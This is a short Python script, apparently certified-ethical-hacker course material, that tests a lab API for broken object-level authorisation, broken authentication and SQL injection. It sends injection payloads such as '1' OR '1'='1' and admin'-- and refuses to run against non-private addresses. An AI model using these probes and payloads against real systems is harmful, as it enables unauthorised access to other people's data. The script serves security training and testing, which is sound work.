#!/usr/bin/env python3
# LAB-ONLY: API Security Testing Suite
# CEH v13 Ultimate Offensive Script 09
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys
import json

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_API_URL = "http://192.168.100.10/api/v1"
LAB_AUTH_TOKEN = "YOUR_LAB_TOKEN_HERE"
# -----------------------------------------------------------------------------------

def test_bola():
    print("[*] Testing Broken Object Level Authorization (BOLA)...")
    for user_id in [1, 2, 3, 9999]:
        try:
            headers = {"Authorization": f"Bearer {LAB_AUTH_TOKEN}"} if LAB_AUTH_TOKEN else {}
            response = requests.get(f"{LAB_API_URL}/users/{user_id}", headers=headers, timeout=3, verify=False)
            print(f"  /users/{user_id} → {response.status_code}")
        except Exception as e:
            print(f"  Error: {e}")

def test_broken_auth():
    print("\n[*] Testing Broken Authentication...")
    test_cases = [
        ("no_token", {}),
        ("invalid_token", {"Authorization": "Bearer invalid123"}),
        ("valid_token", {"Authorization": f"Bearer {LAB_AUTH_TOKEN}"})
    ]
    for name, headers in test_cases:
        try:
            response = requests.get(f"{LAB_API_URL}/me", headers=headers, timeout=3, verify=False)
            print(f"  {name} → {response.status_code}")
        except Exception as e:
            print(f"  Error: {e}")

def test_sql_injection():
    print("\n[*] Testing SQL Injection...")
    payloads = ["'", "1' OR '1'='1", "admin'--"]
    for payload in payloads:
        try:
            response = requests.get(f"{LAB_API_URL}/search?q={payload}", timeout=3, verify=False)
            print(f"  q={payload} → {response.status_code}")
        except Exception as e:
            print(f"  Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: API Security Testing Suite")
    print("="*80)
    print(f"[*] API Base: {LAB_API_URL}")
    print("-"*80)
    test_bola()
    test_broken_auth()
    test_sql_injection()

if __name__ == "__main__":
    if not any(prefix in LAB_API_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()
